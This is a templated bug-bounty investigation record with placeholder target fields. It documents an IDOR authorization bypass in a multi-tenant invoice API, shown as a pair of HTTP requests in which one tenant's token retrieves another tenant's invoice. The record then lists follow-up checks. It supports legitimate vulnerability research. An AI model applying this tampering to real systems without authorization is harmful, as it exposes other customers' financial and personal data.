---
id: {{ID}}
title: "{{TITLE}}"
target: "{{TARGET}}"
platform: {{PLATFORM}}
date: {{DATE}}
type: investigation
status: Hunting
severity: High
cvss_score: null
bounty_payout: 0
vuln_class: "CWE-639: IDOR"
root_cause_category: Access Control
failure_reason: null
techniques:
  - parameter-tampering
  - auth-context-switching
lessons_learned:
  - "Investigate discrepancies between JSON body attributes and query parameters."
---

# Investigation Record: {{TITLE}}

## 1. Initial Anomaly & Discovery
- **Target Subsystem / Endpoint:** `https://api.{{TARGET_DOMAIN}}/v2/...`
- **Discovery Date:** {{DATE}}
- **Observation:**
  - Observed behavior difference when substituting user/tenant identifiers across authorization tokens.

---

## 2. Hypothesis & Threat Model
- **Hypothesis:** The application validates tenant authorization at the HTTP gateway level for primary routes, but secondary microservice forwarding omits token tenant verification.
- **Vulnerability Class:** CWE-639: Authorization Bypass Through User-Controlled Key
- **Root Cause Category:** Access Control

---

## 3. Investigation Steps & Observed Responses
### Test Case A: Baseline Authorized Request (Tenant A)
```http
GET /api/v2/workspaces/ws_111/invoices/inv_999 HTTP/1.1
Host: api.{{TARGET_DOMAIN}}
Authorization: Bearer <TOKEN_TENANT_A>

HTTP/1.1 200 OK
Content-Type: application/json

{"id": "inv_999", "amount": 450.00, "customer": "Tenant A Corp"}
```

### Test Case B: Tampered Identifier Request (Tenant B Token requesting Tenant A Asset)
```http
GET /api/v2/workspaces/ws_222/invoices/inv_999 HTTP/1.1
Host: api.{{TARGET_DOMAIN}}
Authorization: Bearer <TOKEN_TENANT_B>

HTTP/1.1 200 OK
Content-Type: application/json

{"id": "inv_999", "amount": 450.00, "customer": "Tenant A Corp"}
```

---

## 4. Current Findings & Evidence
- The server returned HTTP 200 with sensitive invoice details belonging to Tenant A when queried by Tenant B.
- Data exposed includes: billing address, line items, banking details, and contact names.

---

## 5. Next Steps / Verification Gate
- [ ] Verify if write operations (PATCH, DELETE) are equally vulnerable.
- [ ] Confirm absence of secondary rate limits or caching artifacts.
- [ ] Run 7-Question Gate from `triage-validation` before drafting report.
- [ ] Prepare clean, non-destructive reproduction script using `curl`.
